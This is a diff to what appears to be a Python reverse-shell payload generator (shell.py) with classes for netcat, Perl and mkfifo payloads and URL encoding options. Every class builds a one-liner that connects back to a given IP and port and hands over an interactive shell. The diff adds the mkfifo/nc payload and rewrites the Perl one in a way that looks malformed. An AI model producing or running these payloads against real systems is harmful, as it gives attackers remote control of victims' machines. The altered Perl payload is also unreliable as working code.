@@ -70,11 +70,18 @@ class Netcat(Encode):
         self.__payload = f"nc -vn {self.__ip} {self.__porta} -e \"/bin/bash\""
         super().__init__(self.__payload)
 
-Class Perl(Encode):
+class Perl(Encode):
     def __init__(self:object,ip:str,porta:str):
         self.__ip = ip
         self.__porta = porta
-        self.__payload = f"perl -e 'use Socket;$i=\"{self.__ip}\";$p={self.__porta};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'"
+        self.__payload = f"perl -e 'use Socket;$i=\"$ENV{"+self.__ip+"}"+";$p=$ENV{"+self.__porta+"};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+        super().__init__(self.__payload)
+
+class Mkfifo(Encode):
+    def __init__(self:object,ip:str,porta:str):
+        self.__ip = ip
+        self.__porta = porta
+        self.__payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {self.__ip} {self.__porta} >/tmp/f"
         super().__init__(self.__payload)
 
 parser = argparse.ArgumentParser(prog=banner(),usage="python3 shell.py -ip 192.168.4.80 -port 4444 -payload bash -encode urlencode")
